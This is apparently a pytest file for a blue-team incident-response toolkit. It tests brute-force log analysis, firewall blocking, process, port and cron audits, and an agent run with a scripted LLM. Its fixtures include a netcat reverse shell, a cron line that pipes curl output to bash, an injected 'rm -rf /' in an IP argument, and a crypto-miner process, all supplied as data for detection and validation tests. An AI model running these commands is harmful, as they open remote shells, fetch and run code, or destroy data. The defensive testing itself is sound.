"""Real-world Blue Team test scenarios (QUARR Blue).

Two incident scenarios exercised end-to-end against the actual blue-team tools,
with the subprocess layer (`_run` / `_shell`) mocked so no real system commands
run. Realistic command output is injected (including a captured auth.log), so
the detection/parsing logic is verified deterministically.

Scenario A — SSH brute-force response          (MITRE T1110 / T1078)
Scenario B — Malware + C2 + persistence hunt    (MITRE T1059 / T1071 / T1053 / T1070)

These also give quarr/tools/blue_team.py real coverage (previously ~26%).
"""

from pathlib import Path

import pytest

from quarr.tools import blue_team as bt

FIXTURES = Path(__file__).parent / "fixtures"


def _fake_shell(mapping, default="[No output]"):
    """Return a fake _run/_shell that dispatches on a substring of the command."""
    def _fn(cmd, timeout=30):
        for needle, output in mapping.items():
            if needle in cmd:
                return output
        return default
    return _fn


# ===========================================================================
# Scenario A — SSH brute-force response
# ===========================================================================

@pytest.mark.integration
class TestBruteForceResponse:
    def test_log_analysis_detects_failed_logins(self, monkeypatch):
        auth_log = (FIXTURES / "auth_bruteforce.log").read_text()
        # log_analysis builds "tail ... | grep -i Failed" and calls _shell.
        monkeypatch.setattr(bt, "_shell", _fake_shell({"auth.log": auth_log}))

        out = bt.log_analysis(log_type="auth", filter_pattern="Failed")

        assert "[ERROR]" not in out
        assert "Failed password" in out
        # The attacker IP repeats across the log — the core brute-force signal.
        assert out.count("185.220.101.34") >= 5

    def test_log_analysis_rejects_unknown_log_type(self):
        out = bt.log_analysis(log_type="does-not-exist")
        assert "[ERROR]" in out and "Unknown log type" in out

    def test_active_connections_shows_attacker_session(self, monkeypatch):
        ss_out = (
            "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port\n"
            "tcp   ESTAB  0      0      10.10.10.20:22       185.220.101.34:51133\n"
        )
        monkeypatch.setattr(bt, "_shell", _fake_shell({"ss -tunapl": ss_out}))

        out = bt.active_connections("established")
        assert "185.220.101.34" in out
        assert ":22" in out

    def test_firewall_block_valid_ip(self, monkeypatch):
        # firewall_block uses _run; success == no [ERROR] in the command output.
        monkeypatch.setattr(bt, "_run", lambda cmd, timeout=30: "")
        out = bt.firewall_block("185.220.101.34")
        assert out.startswith("✅ Blocked")
        assert "185.220.101.34" in out

    def test_firewall_block_rejects_invalid_ip(self):
        # No monkeypatch: validation must fail before any subprocess call.
        out = bt.firewall_block("185.220.101.34; rm -rf /")
        assert "[ERROR]" in out and "Invalid IP" in out

    def test_firewall_block_rejects_hostname(self):
        assert "[ERROR]" in bt.firewall_block("evil.example.com")

    def test_firewall_unblock_valid_ip(self, monkeypatch):
        monkeypatch.setattr(bt, "_run", lambda cmd, timeout=30: "")
        out = bt.firewall_unblock("185.220.101.34")
        assert out.startswith("✅ Unblocked")


# ===========================================================================
# Scenario B — Malware / C2 / persistence hunt
# ===========================================================================

@pytest.mark.integration
class TestMalwareResponse:
    def test_process_monitor_flags_reverse_shell_and_miner(self, monkeypatch):
        ps_out = (
            "USER  PID %CPU COMMAND\n"
            "root  666 99.0 /tmp/.x/xmrig --donate-level 1\n"
            "www   777  0.1 nc -e /bin/bash 185.220.101.34 4444\n"
            "root    1  0.0 /sbin/init\n"
        )
        monkeypatch.setattr(bt, "_shell", _fake_shell({"ps aux": ps_out}))

        out = bt.process_monitor()
        assert "SUSPICIOUS PROCESSES" in out
        assert "🚨" in out
        assert "xmrig" in out
        assert "nc -e" in out

    def test_process_monitor_clean_system(self, monkeypatch):
        ps_out = "USER PID %CPU COMMAND\nroot 1 0.0 /sbin/init\nsyslog 300 0.1 /usr/sbin/rsyslogd\n"
        monkeypatch.setattr(bt, "_shell", _fake_shell({"ps aux": ps_out}))
        out = bt.process_monitor()
        assert "SUSPICIOUS PROCESSES" not in out

    def test_active_connections_suspicious_c2_port(self, monkeypatch):
        c2 = (
            "tcp ESTAB 0 0 10.10.10.20:44122 185.220.101.34:4444\n"
        )
        # active_connections('suspicious') greps for the C2 ports via _shell.
        monkeypatch.setattr(bt, "_shell", _fake_shell({":4444": c2}))
        out = bt.active_connections("suspicious")
        assert "4444" in out
        assert "185.220.101.34" in out

    def test_port_audit_flags_backdoor_port(self, monkeypatch):
        ss_out = (
            "tcp LISTEN 0 128 0.0.0.0:22   0.0.0.0:*\n"
            "tcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:*\n"
        )
        monkeypatch.setattr(bt, "_shell", _fake_shell({"ss -tulpn": ss_out}))
        out = bt.port_audit()
        assert "SUSPICIOUS PORTS" in out
        assert ":4444" in out

    def test_port_audit_clean(self, monkeypatch):
        ss_out = "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*\ntcp LISTEN 0 128 0.0.0.0:443 0.0.0.0:*\n"
        monkeypatch.setattr(bt, "_shell", _fake_shell({"ss -tulpn": ss_out}))
        out = bt.port_audit()
        assert "SUSPICIOUS PORTS" not in out

    def test_cron_audit_surfaces_persistence(self, monkeypatch):
        cron = "* * * * * root curl -s http://185.220.101.34/x.sh | bash\n"
        monkeypatch.setattr(bt, "_shell", _fake_shell({"cron": cron, "crontab": cron}, default=cron))
        out = bt.cron_audit()
        assert "185.220.101.34" in out

    def test_file_integrity_check_rejects_traversal(self):
        out = bt.file_integrity_check(directory="/usr/bin/../../etc")
        assert "[ERROR]" in out

    def test_file_integrity_check_reports_modified(self, monkeypatch):
        find_out = "0 755 -rwxr-xr-x 1 root root 44 Sep 4 05:00 /usr/bin/.hidden\n"
        monkeypatch.setattr(bt, "_shell", _fake_shell({"-mtime": find_out, "-perm": "[No output]"}))
        out = bt.file_integrity_check(directory="/usr/bin", days=7)
        assert "MODIFIED IN LAST 7 DAYS" in out
        assert "/usr/bin/.hidden" in out


# ===========================================================================
# End-to-end: agent drives the brute-force playbook (mock LLM, no real tools)
# ===========================================================================

@pytest.mark.integration
async def test_agent_runs_bruteforce_response_flow(monkeypatch, sample_engagement):
    """The agent selects blue-team tools in sequence and concludes.

    LLM is scripted; tool handlers are patched to return canned blue-team
    output so no real commands run. Verifies policy allows LOW/MEDIUM blue
    tools and the loop reaches a conclusion.
    """
    import quarr.core.agent as agent_mod
    from quarr.core.agent import QuarrAgent

    auth_log = (FIXTURES / "auth_bruteforce.log").read_text()

    script = [
        {"content": "", "tool_calls": [{"function": {
            "name": "log_analysis",
            "arguments": {"log_type": "auth", "filter_pattern": "Failed"}}}], "raw": {}},
        {"content": "", "tool_calls": [{"function": {
            "name": "firewall_block",
            "arguments": {"ip_address": "185.220.101.34"}}}], "raw": {}},
        {"content": "Brute force from 185.220.101.34 confirmed and blocked.",
         "tool_calls": [], "raw": {}},
    ]

    class ScriptedLLM:
        def __init__(self, s): self.s = list(s)
        async def chat(self, messages, tools=None, max_tokens=1024):
            return self.s.pop(0) if self.s else {"content": "done", "tool_calls": [], "raw": {}}

    monkeypatch.setattr(agent_mod, "create_llm_client", lambda **kw: ScriptedLLM(script))

    reg = agent_mod.TOOL_REGISTRY
    monkeypatch.setattr(reg["log_analysis"], "handler",
                        lambda **kw: auth_log)
    monkeypatch.setattr(reg["firewall_block"], "handler",
                        lambda **kw: "✅ Blocked: 185.220.101.34")

    # allow-all operations; role operator can run LOW/MEDIUM blue tools.
    sample_engagement.allowed_operations = []
    agent = QuarrAgent(engagement=sample_engagement, backend="ollama",
                       session_role="operator")

    result = await agent.run("Investigate and stop the SSH brute force")

    assert "185.220.101.34" in result
    assert "blocked" in result.lower()
    # The agent recorded both tool executions in state.
    ran = [t.tool_name for t in agent.state.tool_history]
    assert "log_analysis" in ran and "firewall_block" in ran
